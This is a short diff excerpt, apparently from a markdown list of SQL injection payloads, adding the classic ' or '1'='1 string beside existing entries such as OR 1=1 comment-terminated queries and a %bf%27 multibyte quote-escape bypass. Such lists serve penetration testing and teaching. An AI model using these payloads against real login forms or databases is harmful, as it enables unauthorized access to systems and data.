@@ -51,3 +51,7 @@ SELECT * FROM users WHERE username = '' OR 1=1; --' LIMIT 1;
 %bf%27 or 1=1 --
 ```
 
+```
+' or '1'='1
+```
+
